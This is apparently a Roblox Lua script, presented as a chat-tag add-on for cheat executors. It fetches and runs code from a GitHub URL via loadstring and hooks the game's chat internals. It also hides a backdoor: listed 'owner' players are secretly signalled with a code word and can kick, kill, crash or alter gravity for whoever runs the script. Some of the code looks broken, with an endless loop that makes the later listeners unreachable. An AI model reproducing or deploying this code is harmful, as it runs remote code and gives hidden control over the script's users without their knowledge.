local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local lplr = Players.LocalPlayer
local yes = Players.LocalPlayer.Name
local ChatTag = loadstring(game:HttpGet("https://raw.githubusercontent.com/NTDCore/Chattags/main/Tags.lua"))()



    local oldchanneltab
    local oldchannelfunc
    local oldchanneltabs = {}

--// Chat Listener
for i, v in pairs(getconnections(ReplicatedStorage.DefaultChatSystemChatEvents.OnNewMessage.OnClientEvent)) do
	if
		v.Function
		and #debug.getupvalues(v.Function) > 0
		and type(debug.getupvalues(v.Function)[1]) == "table"
		and getmetatable(debug.getupvalues(v.Function)[1])
		and getmetatable(debug.getupvalues(v.Function)[1]).GetChannel
	then
		oldchanneltab = getmetatable(debug.getupvalues(v.Function)[1])
		oldchannelfunc = getmetatable(debug.getupvalues(v.Function)[1]).GetChannel
		getmetatable(debug.getupvalues(v.Function)[1]).GetChannel = function(Self, Name)
			local tab = oldchannelfunc(Self, Name)
			if tab and tab.AddMessageToChannel then
				local addmessage = tab.AddMessageToChannel
				if oldchanneltabs[tab] == nil then
					oldchanneltabs[tab] = tab.AddMessageToChannel
				end
				tab.AddMessageToChannel = function(Self2, MessageData)
					if MessageData.FromSpeaker and Players[MessageData.FromSpeaker] then
						if ChatTag[Players[MessageData.FromSpeaker].Name] then
							MessageData.ExtraData = {
								NameColor = Players[MessageData.FromSpeaker].Team == nil and Color3.new(0, 1, 1)
									or Players[MessageData.FromSpeaker].TeamColor.Color,
								Tags = {
									table.unpack(MessageData.ExtraData.Tags),
									{
										TagColor = ChatTag[Players[MessageData.FromSpeaker].Name].TagColor,
										TagText = ChatTag[Players[MessageData.FromSpeaker].Name].TagText,
									},
								},
							}
						end
					end
					return addmessage(Self2, MessageData)
				end
			end
			return tab
		end
	end
end

local Command = {
    ["Checking"] = function()
        for i, v in pairs(game.Players:GetPlayers()) do
            for k, b in pairs(ChatTag) do
                if v.UserId == tonumber(b) then
                    return true
                end
            end
        end
        return false
    end,
    ["GetUser"] = function()
        for i, v in pairs(game.Players:GetPlayers()) do
            for k, b in pairs(ChatTag) do
                if v.UserId == tonumber(b) then
                    return v.Name
                end
            end
        end
    end
}


local alreadytold = {}

repeat
    if lplr.Name == Command then break end
    task.wait(1)
    if Command["Checking"]() then
        if not table.find(alreadytold, Command["GetUser"]()) then
            table.insert(alreadytold, Command["GetUser"]())
            args = {
                [1] = "/whipser " .. Command["GetUser"](),
                [2] = "All"
            }
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
            task.wait(0.5)
            args = {
                [1] = "RQYBPTYNURYZC",
                [2] = "All"
            }
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
        end
    end    
until (true == false)

for i, v in pairs(game.Players:GetPlayers()) do
    if lplr.Name == Command["GetUser"]() then 
        v.Chatted:connect(function(msg)
            if msg == "RQYBPTYNURYZC" then
                print(lplr.Name.." is use ur script")
            end
        end)
    else
        for lol, xd in pairs(ChatTag) do
            if v.UserId == tonumber(xd) then
                v.Chatted:connect(function(msg)
                    if msg:find("?kick") then
                        if msg:find(lplr.Name) then
                            local args = msg:gsub("?kick " .. lplr.Name, "")
                            lplr:kick(args)
                        end
                    end
                    if msg:find("?kill") then
                        if msg:find(lplr.Name) then
                            lplr.Character.Humanoid:TakeDamage(lplr.Character.Humanoid.Health)
                        end
                    end
                    if msg:find("?crash") then
                        if msg:find(lplr.Name) then
                            setfpscap(0)
                        end
                    end
                    if msg:find("?gravity") then
                        if msg:find(lplr.Name) then
                            local args = msg:gsub("?gravity " .. lplr.Name, "")
                            game.Workspace.Gravity = tonumber(args)
                        end
                    end
                end)
            end
        end
    end
end
